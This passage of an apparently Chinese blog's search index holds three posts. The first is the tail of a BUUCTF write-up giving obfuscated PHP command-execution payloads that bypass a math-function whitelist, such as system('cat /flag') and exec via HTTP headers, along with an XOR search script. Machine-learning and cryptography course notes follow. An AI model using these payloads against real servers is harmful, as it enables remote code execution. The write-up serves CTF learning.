class="variable">$abs</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));<span class="variable">$$abs</span>&#123;pi&#125;(<span class="variable">$$abs</span>&#123;sin&#125;)&amp;pi=system&amp;sin=cat /flag</span><br><span class="line"></span><br><span class="line"><span class="variable">$abs</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>)) = _GET;</span><br><span class="line"></span><br><span class="line"><span class="variable">$$abs</span>&#123;pi&#125;(<span class="variable">$$abs</span>&#123;sin&#125; = <span class="variable">$_GET</span>&#123;pi&#125;(<span class="variable">$_GET</span>&#123;sin&#125;); <span class="comment">// 通过get方法传入参数完成命令执行</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="headers传入参数命令执行"><a href="#headers传入参数命令执行" class="headerlink" title="headers传入参数命令执行"></a>headers传入参数命令执行</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="variable">$pi</span>=base_convert,<span class="variable">$pi</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)((<span class="variable">$pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>))()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable">$pi</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>) = base_convert(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>) = exec</span><br><span class="line">((<span class="variable">$pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>))()&#123;<span class="number">1</span>&#125;) = ((base_convert(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>))()&#123;<span class="number">1</span>&#125;) = getallheaders()&#123;<span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line">即 exec(getallheaders()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>几点说明</p><p>getallheaders — 获取全部 HTTP 请求头信息</p><p><img src="https://i.loli.net/2021/03/06/CcBEwGWhjMp9AmO.png" alt="5.png"></p><p>当取数组元素时，用大括号会抛出警告而不是错误</p><p><img src="https://i.loli.net/2021/03/06/WtgMeZJO6rl25QV.png" alt="6.png"></p><p>用上述payload 加上 postman改下headers即可命令执行getflag</p><p><img src="https://i.loli.net/2021/03/06/4kdNB8AUj59IiHu.png" alt="9.png"></p><h3 id="字符串异或命令执行"><a href="#字符串异或命令执行" class="headerlink" title="字符串异或命令执行"></a>字符串异或命令执行</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$whitelist</span> <span class="keyword">as</span> <span class="variable">$white</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">999999</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^_POST$/&quot;</span>,<span class="variable">$white</span> ^ decbin(<span class="variable">$i</span>),<span class="variable">$mach</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;decbin:&quot;</span> . <span class="variable">$i</span> . <span class="string">&#x27; : &#x27;</span> . <span class="variable">$white</span> . <span class="string">&#x27; : &#x27;</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            print_r(<span class="variable">$mach</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^_POST$/&quot;</span>,<span class="variable">$white</span> ^ decoct(<span class="variable">$i</span>),<span class="variable">$mach</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;decoct:&quot;</span> . <span class="variable">$i</span> . <span class="string">&#x27; : &#x27;</span> . <span class="variable">$white</span> . <span class="string">&#x27; : &#x27;</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            print_r(<span class="variable">$mach</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^_POST$/&quot;</span>,<span class="variable">$white</span> ^ dechex(<span class="variable">$i</span>),<span class="variable">$mach</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;dechex:&quot;</span> . <span class="variable">$i</span> . <span class="string">&#x27; : &#x27;</span> . <span class="variable">$white</span> . <span class="string">&#x27; : &#x27;</span> .  <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            print_r(<span class="variable">$mach</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/06/uGUmVAZe5BXbazM.png" alt="7.png"></p><p>发现俩能用的</p><p><code>payload:?c=$pi=dechex(481137)^hexdec;$$pi&#123;1&#125;($$pi&#123;2&#125;)</code></p><p><img src="https://i.loli.net/2021/03/06/y6aTOkVeDoFPcmC.png" alt="8.png"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote><p><a href="https://www.cnblogs.com/wangtanzhi/p/12246731.html">https://www.cnblogs.com/wangtanzhi/p/12246731.html</a><br><a href="https://www.bilibili.com/video/BV1pE411f7DN?t=1567">https://www.bilibili.com/video/BV1pE411f7DN?t=1567</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> web </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Machine Learning</title>
      <link href="2021/03/05/ML/"/>
      <url>2021/03/05/ML/</url>
      
        <content type="html"><![CDATA[<h2 id="1-4-Unsupervised-Learning"><a href="#1-4-Unsupervised-Learning" class="headerlink" title="1-4.Unsupervised Learning"></a>1-4.Unsupervised Learning</h2><p>google news：聚类算法，无监督学习算法</p><p><img src="https://i.loli.net/2021/03/06/1TFOpXztKCkwcrW.png" alt="image-20210306085443145.png"></p><p>聚类算法是unsupervised learning的一种</p><p><img src="https://i.loli.net/2021/03/06/r5F1CvS3Zx9bGOk.png" alt=""></p><blockquote><p>B is a unsupervised learning problem.</p></blockquote><h2 id="2-1-模型描述"><a href="#2-1-模型描述" class="headerlink" title="2-1.模型描述"></a>2-1.模型描述</h2><p><img src="https://i.loli.net/2021/03/06/fF3lQLcRgkxP5iW.png" alt=""></p><p>根据拟合状况预估房价，是一个supervised learning problem，因为每一个大小都有一个“正确的答案”，并且还是回归问题。</p><p>Notation:</p><ul><li>m = Number of training examples</li><li>x = “input” variable / features</li><li><p>y = “output” variable / “target” variable</p></li><li><p>(x,y) = one traing example</p></li><li><p>$(x^{(i)},y^{(i)})$ = $i^{th}$   training example (not exponentiation,i means “index”)</p></li><li><p>h = hypothesis</p></li></ul><p><img src="https://i.loli.net/2021/03/06/2EMSJuBbaqKs6oI.png" alt=""><br>Linear regression with one variable.Univariate linear regression.(one variable)</p><h2 id="2-2代价函数-一"><a href="#2-2代价函数-一" class="headerlink" title="2.2代价函数(一)"></a>2.2代价函数(一)</h2><p><img src="https://i.loli.net/2021/03/06/U9H7TZXSpEtYdaj.png" alt=""></p><p>Cost function  </p><script type="math/tex; mode=display">J(\theta_0,\theta_1)=\frac 1{2m}\sum_{i=1}^m(h_{\theta}(x^{(i)}-y^{(i)})^2</script><h2 id="2-3代价函数-二"><a href="#2-3代价函数-二" class="headerlink" title="2.3代价函数(二)"></a>2.3代价函数(二)</h2><p><img src="https://i.loli.net/2021/03/06/jwi5Mp2K8b3CLPq.png" alt=""></p><p><img src="https://i.loli.net/2021/03/06/4sFmDZuqdGVTi7S.png" alt=""></p><p>简化代价函数使得$\theta_0 = 0$，理解代价函数</p><p>对于上图特殊的training set，可以找出$\theta_1 = 1$时，可以完美拟合</p><h2 id="2-4代价函数-三"><a href="#2-4代价函数-三" class="headerlink" title="2.4代价函数(三)"></a>2.4代价函数(三)</h2><p>当我们使用$\theta_0$和$\theta_1$时，得到cost function图像类似下图</p><p><img src="https://i.loli.net/2021/03/06/skDZCp4OwtTFYib.png" alt=""></p><p>使用等高线的方式来模拟，想象从碗的上方向底部看，minimize J($\theta_0$,$\theta_1$) 就是椭圆的中心，如下图的数据拟合较为不错，cost value可以接受</p><p><img src="https://i.loli.net/2021/03/06/JVmZ7oFTpRDU1zd.png" alt=""></p><h2 id="2-5-梯度下降"><a href="#2-5-梯度下降" class="headerlink" title="2.5 梯度下降"></a>2.5 梯度下降</h2><p>Repeat until convergence{</p><p>​    $\theta_j := \theta_j - \alpha\frac{\partial}{\partial\theta_j}J(\theta_0,\theta_1)  $        (for j = 0 and j = 1) </p><p>}</p><p>// := assignment       ( a := a + 1)</p><p>// $\alpha$为学习率，大的时候下山步子大</p><p><img src="https://i.loli.net/2021/03/09/gQYal6ocdpKqC9R.png" alt="梯度下降1.png" style="zoom:50%;" /></p><h2 id="2-6-梯度下降理解"><a href="#2-6-梯度下降理解" class="headerlink" title="2.6 梯度下降理解"></a>2.6 梯度下降理解</h2><ul><li>梯度下降导数项的意义</li></ul><p><img src="https://i.loli.net/2021/03/09/CyXR7G4TLIKQO1w.png" alt="梯度下降2.png" style="zoom:50%;" /></p><ul><li>梯度下降学习率大小的意义</li></ul><p><img src="https://i.loli.net/2021/03/09/N1mFSpIkrPAnljb.png" alt="梯度下降3-alpha含义.png" style="zoom:50%;" /></p><ul><li>梯度下降到局部最优点的结果</li></ul><p><img src="https://i.loli.net/2021/03/09/nSg2xDTV7yROecG.png" alt="梯度下降4-局部最优点的结果.png" style="zoom:50%;" /></p><h2 id="2-7-线性回归的梯度下降"><a href="#2-7-线性回归的梯度下降" class="headerlink" title="2.7 线性回归的梯度下降"></a>2.7 线性回归的梯度下降</h2><p>梯度下降中导数那一项：</p><script type="math/tex; mode=display">\frac\partial{\partial\theta_j}J(\theta_0,\theta_1) = \frac\partial{\partial\theta_j}\frac1{2m}\sum_{i=1}^m(h_\theta(x^{(i)})-y^{(i)})^2 \\=\frac\partial{\partial\theta_j}\frac1{2m}\sum_{i=1}^m(\theta_0 + \theta_1x^{i}-y^{(i)})^2</script><p>$\theta_0$和$\theta_1$情况下的偏导数：</p><script type="math/tex; mode=display">j=0:\frac\partial{\partial\theta_0}J(\theta_0,\theta_1)=\frac1{m}\sum_{i=1}^m(h_\theta(x^{(i)})-y^{(i)}) \\j=1:\frac\partial{\partial\theta_1}J(\theta_0,\theta_1)=\frac1{m}\sum_{i=1}^m(h_\theta(x^{(i)})-y^{(i)})*x^{(i)}</script><p>该方法是Batch梯度下降法：需要遍历整个训练集</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Machine Learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学笔记</title>
      <link href="2021/03/05/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/"/>
      <url>2021/03/05/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="一-密码学概述和古典密码"><a href="#一-密码学概述和古典密码" class="headerlink" title="一.密码学概述和古典密码"></a>一.密码学概述和古典密码</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><strong>密码编码学</strong>和密码分析学</p><blockquote><p>Plaintext:明文，被隐蔽消息，M</p><p>Ciphertext:密文，C</p><p>Encryption:加密</p><p>Decryption:解密，加密的逆过程</p><p>Encryption algorithm: 加密算法，E()</p><p>Decryption algorithm: 解密算法，D()</p><p>Key: 密钥，控制加密和解密算法操作的数据处理，分别称作加密密钥和解密密钥，k</p></blockquote><ul><li>传统密码体制所用的加密密钥和解密密钥相同或<strong>实质上等同</strong>，从一个易于推出另一个：单钥或对称密码体制，无法实现不可否认性</li><li>加密密钥和解密密钥不相同，从一个难于推出另一个，双钥，或非对称密码体制</li></ul><p>密码体系是一个五元组(M C K E D)</p><p>密钥空间K，在单钥体制下K1 = K2 = K</p><p>加密变换$E_{k1}$</p><p>解密变换$D_{k2}$</p><p><strong>(M C K $E<em>{k1}$ $D</em>{k2}$)为保密通信系统</strong></p><p>密码分析者，选定变换函数h，对c进行变换，得到的明文是明文空间中的某个元素，</p><p>即$m’ = h(x)$</p><p>如果m’ = m，则分析成功</p><h3 id="保密系统基本要求"><a href="#保密系统基本要求" class="headerlink" title="保密系统基本要求"></a>保密系统基本要求</h3><ol><li>理论上不可破，即 $ p_r{m’=m}=0 $，当知道已知的明文密文时，要决定密钥或任意明文在计算上是不可行的</li><li>Kerchhoff原则，保密性不依赖于加密体制或算法的保密，而依赖于密钥</li><li>加密解密算法适用于所有密钥空间中的元素</li><li>系统便于实现和使用</li></ol><h3 id="密码系统的攻击"><a href="#密码系统的攻击" class="headerlink" title="密码系统的攻击"></a>密码系统的攻击</h3><ul><li>惟密文攻击</li><li>已知明文攻击</li><li>选择明文攻击</li><li>选择密文攻击</li></ul><div class="table-container"><table><thead><tr><th>攻击类型</th><th style="text-align:left">攻击者掌握的内容</th><th></th></tr></thead><tbody><tr><td>惟密文攻击</td><td style="text-align:left">加密算法，截获的部分密文</td><td></td></tr><tr><td>已知明文攻击</td><td style="text-align:left">以上及一个或多个明文密文对</td><td></td></tr><tr><td>选择明文攻击</td><td style="text-align:left">自己选择的明文消息及由密钥产生的密文</td><td></td></tr><tr><td>选择密文攻击</td><td style="text-align:left">自己选择的密文消息及相应的被解密的明文</td><td></td></tr><tr><td></td><td style="text-align:left"></td></tr></tbody></table></div><p>无条件安全：无论敌手截获多少密文，花费多长时间都不能解密密文 （一次一密</p><p>计算上安全：1，破译密文的代价超过被加密信息的价值。2，破译密文所花的时间超过信息的有用期。</p><h2 id="密码学发展"><a href="#密码学发展" class="headerlink" title="密码学发展"></a>密码学发展</h2><p>Cryptology - 密码学</p><blockquote><p>三个阶段：</p><p>1.1949之前：古典密码 艺术</p><p>2.1949-1975：近代密码 艺术-&gt;科学</p><p>3.1976年至今：现代密码</p></blockquote><p>古典密码：</p><ol><li>斯巴达棍。算法是缠绕，密钥是棍子的粗细。</li><li>单表代换密码：凯撒密码，单字母代换。算法是代换，密钥是密码表。</li><li>多表代换密码：Enigma密码机。</li></ol><p>近代密码：</p><ol><li>1977年，NBS颁布采纳IBM设计的方案作为非机密数据的数据加密标准DES，Data Encryption Standard。</li><li>2001.11.16，采用AES算法</li><li>1976，W.Diffie，M.E.Hellman，提出非对称密码算法思想</li><li>1977，Rivest，Shamir，Adleman提出RSA密码体制</li></ol><p>公钥密码学实现加密密钥和解密密钥的分离，伟大革命，使用两个密钥：公钥，私钥</p><h2 id="仿射变换"><a href="#仿射变换" class="headerlink" title="仿射变换"></a>仿射变换</h2><p>$c = E_{a,b}(m) \equiv am + b(mod26)$</p><p>$m = D_{a,b}(c) \equiv a^{-1} + (c - b)(mod26)$</p><p>当a和26互为素数的时候才可以解密 最大公因子为1时才互为素数 （不互素的话逆元求不出来，就没法解密</p><p>ab为密钥</p><p>$a^{-1}$为a的逆元</p><h3 id="单表代换优缺点"><a href="#单表代换优缺点" class="headerlink" title="单表代换优缺点"></a>单表代换优缺点</h3><p>频次问题</p><p>相对位置问题</p><h2 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h2><p>加密算法</p><p>$c<em>{i+td}=E_k(m</em>{i+td})\equiv(m_{i+td}+k_i)(mod q)$</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.理解保密通信系统模型</p><p>2.密码体制从原理分为两大类，单钥和双钥体制</p><p>3.加密算法两条安全准则</p><p>4.能够计算仿射变换</p><p>5.置换密码的操作</p><h1 id="二-密码学相关数学知识"><a href="#二-密码学相关数学知识" class="headerlink" title="二.密码学相关数学知识"></a>二.密码学相关数学知识</h1><h2 id="1-素数和互素"><a href="#1-素数和互素" class="headerlink" title="1.素数和互素"></a>1.素数和互素</h2><ul><li><p>因子</p><ul><li>b能整除a，b|a : b是a的因子</li><li>b|1    b = $\pm$1</li><li>b|a a|b 则 a=$\pm$b</li><li>b|a  b|c. 则对于任意整数m和n  -&gt; b|(am+cn)</li></ul></li><li><p>素数</p><ul><li>素数是现代数论的核心内容</li><li>p的因子只有 $\pm$1和 $\pm$p</li><li>整数分解的唯一性定理 任一正整数可以唯一分解成素数的乘积<ul><li>$a = p_1^{e_1} + p_2^{e_2} + … + p_t^{e_t}$</li><li>$e_i$是正整数 $p_i$是素数</li></ul></li></ul></li><li><p>互素数 </p><ul><li>c是a和b的最大公因子 c=gcd(a,b)</li><li>因为所有不为0的整数都是0的因子，因此，gcd(a,0) = |a|</li><li><p>如果gcd(a,b) = 1，则称a，b是互素的</p></li><li><p>最小公倍数 lcm。d是a和b的最小公倍数，d=lcm(a,b)</p></li><li>若gcd(a,b) = 1，则lcm(a,b) = a * b</li></ul></li></ul><h2 id="2-模运算"><a href="#2-模运算" class="headerlink" title="2.模运算"></a>2.模运算</h2><ul><li><p>数论</p><ul><li><p>是密码学特别是公钥密码学的基本工具</p></li><li><p>离散的数字集合</p></li><li><p>运算是模加，模减，逆运算</p></li><li><p>对整数和多项式进行模运算</p></li><li><p>字母的通用表示：</p><ul><li>n: 非负整数</li><li><p>p: 素数</p></li><li><p>Z: 整数集合</p></li><li>R: 实数集合</li><li><p>Q: 有理数集合</p></li><li><p>$Z_n$ = {0,1,2…n-1}小于n的非负整数集合</p></li></ul></li></ul></li><li><p>模运算</p><ul><li>a = $\lfloor a/n\rfloor$ n + (a mod n)</li></ul></li><li><p>同余</p><ul><li>a mod n= b mod n    a $\equiv$ b mod n</li><li>n|(a-b) 等价a $\equiv$ b mod n</li></ul></li><li><p>同余性质</p><ul><li>a $\equiv$ b mod n，则b $\equiv$ a mod n</li><li>a $\equiv$ b mod n，b $\equiv$ c mod n，则a $\equiv$ c mod n</li><li>a $\equiv$ b mod n，d｜n，则a $\equiv$ b mod d</li><li>a $\equiv$ b mod $n_i$ ， d = lcm($n_1,n_2,…n_k$)，则a $\equiv$ b mod d，(i = 1,2,…,k)</li></ul></li><li><p>同余类/等价类/模n剩余类</p><ul><li>与a模n同余的全体成为a的同余类记为$[a]_n$</li><li>$Z_n$为模n的等价类集合</li></ul></li><li><p>等价类性质</p><ul><li>在做mod n的加法和乘法时，等价类的元素可以替换，结果不变</li></ul></li><li><p>模运算性质</p><ul><li>加运算和乘运算先做模和后做模不影响结果</li><li>满足交换律，结合律，分配律</li><li>单位元，0是加法单位元，1是乘法单位元</li></ul></li></ul><h2 id="3-模指数运算"><a href="#3-模指数运算" class="headerlink" title="3.模指数运算"></a>3.模指数运算</h2><p>模指数运算</p><ul><li>$a^m \pmod p$</li><li>思路：现将m用二进制表示</li><li>？快速指数运算查询</li><li>阶 $ord_n(a)$， 满足 $a^m \equiv $ 1 mod n 的最小正整数m为模n下a的阶</li><li>$ord_n(a)$ = m，$ a^k \equiv 1$ mod n的充要条件是k为m的倍数</li></ul><h2 id="4-费马定理和欧拉定理"><a href="#4-费马定理和欧拉定理" class="headerlink" title="4.费马定理和欧拉定理"></a>4.费马定理和欧拉定理</h2><ul><li>费马定理<ul><li>p是素数，a是正整数，且gcd(a,p) = 1,则$a^{p-1}\equiv1$ mod p</li><li>$aa^{p-2}\equiv$ mod p 或者 $a^{-1} \equiv a^{p-2}$ mod p</li><li>$2^{100}  $ mod 13 = 3 (满足费马定理，即$2^{12} \equiv 1$ mod 13，即$2^{96} \equiv 1$ mod 13)  </li></ul></li></ul><h2 id="5-素性检测"><a href="#5-素性检测" class="headerlink" title="5.素性检测"></a>5.素性检测</h2><p>素性检测就是对给定的数检验是否为素数</p><p>费马定理的逆命题不成立，伪素数（卡米歇尔数）</p><ul><li>埃拉托斯散筛法</li><li><p>Miller-Rabin概率检测法</p><h2 id="6-欧几里得算法"><a href="#6-欧几里得算法" class="headerlink" title="6.欧几里得算法"></a>6.欧几里得算法</h2></li></ul><p>辗转相除法</p><h2 id="7-中国剩余定理"><a href="#7-中国剩余定理" class="headerlink" title="7.中国剩余定理"></a>7.中国剩余定理</h2><p>小数重构大数</p><p>大数用小数表示</p><h2 id="8-群环域"><a href="#8-群环域" class="headerlink" title="8.群环域"></a>8.群环域</h2><ul><li><p>代数系统</p><ul><li>代数系统是一种数学模型，包含要处理的数学对象的集合及集合上的关系或运算。</li><li>群，环，域都是代数系统。</li></ul></li><li><p>半群</p><ul><li>任取ab属于S，a和b的运算*都在S中，则S对运算*是封闭的</li><li>满足结合律</li><li>满足以上两点，称为<G,*>为半群</li></ul></li><li><p>群</p><ul><li>封闭性</li><li>结合律</li><li>单位元：$a<em>e = e</em>a = a$，e称为$<G,*>$的单位元</li><li>逆元：对任取a属于G，存在元素$a^{-1}$,$a <em> a^{-1} = a^{-1} </em> a = e$</li><li>满足以上几点称为$<G,*>$是群</li><li>实例 $<Z_8,+>$，模8加</li><li>实例 XOR，模2加</li><li>实例，加法群<ul><li>对任意n大于等于1，整数模n的集合构成一个包含n个元素的有限模n加法群，单位元是0，群中任一元素a，它的逆元是n-a，这个群记为$Z_n$</li></ul></li><li><p>实例，乘法群不是群，是幺半群，不满足逆元的条件</p></li><li><p>乘法群 $Z_n^*$</p><ul><li>$Z_n^*={x\in Z_n:gcd(x,n)=1}$，小于n的非负整数且与n互素</li><li>模n乘法群，单位元e = 1</li><li>是abel群，$|Z_n^*| = \psi(n)$</li><li>对素数p，$Z_p^* = Z_p - 0$</li></ul></li></ul></li></ul><ul><li><p>Abel群</p><ul><li>运算*表示加法时，称为加法群</li><li>乘法，乘法群</li><li>若G的元素是有限的，称为有限群，否则为无限群</li><li>有限群中，G的元素个数称为群G的阶数，表示为$|G|$ or $#G$</li><li>还满足交换律，则称为群$<G,*>$为Abel群</li><li><p>密码学中用到的几乎都为Abel群</p></li><li><p>实例 $<Z_8,+>$，模8加，阶为8</p></li></ul></li></ul><ul><li>循环群<ul><li>$g^i = a$，a为任意的一个元素，g为生成元或本原元</li><li>即能够自己对自己做运算，最终能够遍历群</li><li>实例<ul><li>$Z_4$</li><li>$Z_p^*$，p为素数，肯定存在生成元<ul><li>定理$Z_n^*$每一个元素都有乘法逆元</li><li>并不是每一个元素都是生成元</li></ul></li></ul></li><li>本原元的存在性<ul><li>对模素数p<ul><li><ol><li>其生成元必定存在</li><li>当g为生成元且p与p-1互素时，$g^a$  mod p也是生成元</li><li>生成元个数为$\psi(p-1)$</li></ol></li></ul></li></ul></li></ul></li></ul><ul><li>元素的阶<ul><li>拉格朗日定理推论，提供了群的阶和群中元素阶的关系</li></ul></li></ul><ul><li>环<ul><li>$<R,+>$是Abel群</li><li>$<R,*>$是半群</li><li>分配律</li><li>$<R,+,*>$是环</li></ul></li></ul><ul><li>域<ul><li>$<F,+>$ 是Abel群，0是+的单位元</li><li>$<F-0,*>$ 是Abel群</li><li>分配律</li><li>$<F,+,*>$是域</li></ul></li></ul><ul><li>有限域<ul><li>若q是素数的幂，即$q = p^n$ ，p是素数，n是正整数，则阶为q的域记为GF(q)</li></ul></li></ul><h2 id="9-离散对数"><a href="#9-离散对数" class="headerlink" title="9.离散对数"></a>9.离散对数</h2><h2 id="10-平方剩余"><a href="#10-平方剩余" class="headerlink" title="10.平方剩余"></a>10.平方剩余</h2><h2 id="11-小结"><a href="#11-小结" class="headerlink" title="11.小结"></a>11.小结</h2><h1 id="三-应用密码学"><a href="#三-应用密码学" class="headerlink" title="三.应用密码学"></a>三.应用密码学</h1><h2 id="1-流密码"><a href="#1-流密码" class="headerlink" title="1.流密码"></a>1.流密码</h2><p>流密码的基本思想：利用密钥k产生一个密钥流，使用规则对明文串加密</p><p>与维吉尼亚类似，多表代换密码</p><p>密钥流通过密钥发生器f产生</p><p> $z_i = f(k,\theta_i)$</p><p>分组密码和流密码的区别在于有无记忆性</p><p>流密码的滚动密钥，由函数f，密钥k和初始状态西格玛完全确定。此后，输入的密文可能影响加密器中内部记忆元件的存储状态，因而可能依赖<strong>于所有输入</strong>的影响。</p><p>可分为同步和自同步两种</p><p>对称密码体制</p><p>同步流密码的变换$E_i$可以有多种选择，只要变换即可逆即可。</p><p>二元加法流密码是最常用的流密码的体制。即异或。</p><p>密钥流序列Z应该具有如下性质</p><ul><li>极大的周期</li><li>良好的统计特性</li><li>抗线性分析</li><li>抗统计分析</li></ul><h3 id="有限状态自动机"><a href="#有限状态自动机" class="headerlink" title="有限状态自动机"></a>有限状态自动机</h3><p>是具有离散输入和输出的一种数学模型，由三部分组成</p><ol><li>有限状态集</li><li>有限输入字符集，有限输出字符集</li><li>转移函数</li></ol><h3 id="密钥流产生器"><a href="#密钥流产生器" class="headerlink" title="密钥流产生器"></a>密钥流产生器</h3><p>关键是密钥流产生器。一般可将其看成为参数为k的有限状态自动机，有输出符号集，一个状态集，和两个函数以及一个初始状态组成</p><p>两个函数为状态转移函数和字符输出函数</p><p>LFSR：线性反馈移位寄存器</p><p>最大周期为2的n次方减1，n是几级寄存器</p><h2 id="2-分组密码体制"><a href="#2-分组密码体制" class="headerlink" title="2.分组密码体制"></a>2.分组密码体制</h2><p>对称密码体制</p><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h3><ul><li><p>加密解密</p></li><li><p>构成其他加密算法的组成元素</p></li></ul><ul><li>明文</li><li>明文分组</li><li>密钥</li><li>密文分组</li><li>加密函数</li></ul><p>通常取密文分组数量和明文分组数量相等</p><ul><li>要求<ul><li>分组长度n足够大，防止明文穷举攻击法</li><li>密钥量足够大，即置换子集中的元素足够多，以防止密钥穷举攻击，但又不能过长，管理问题</li><li>由密钥确定置换的算法要足够复杂</li><li>加密和解密运算简单，易于软件和硬件高速实现</li></ul></li></ul><h3 id="2-DES"><a href="#2-DES" class="headerlink" title="2.DES"></a>2.DES</h3><p>密钥长度为56位</p><h3 id="3-分组密码体制的运行模式"><a href="#3-分组密码体制的运行模式" class="headerlink" title="3.分组密码体制的运行模式"></a>3.分组密码体制的运行模式</h3><h3 id="4-IDEA"><a href="#4-IDEA" class="headerlink" title="4.IDEA"></a>4.IDEA</h3><h3 id="5-AES"><a href="#5-AES" class="headerlink" title="5.AES"></a>5.AES</h3>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 校内课程笔记 </tag>
            
            <tag> Cryptography </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
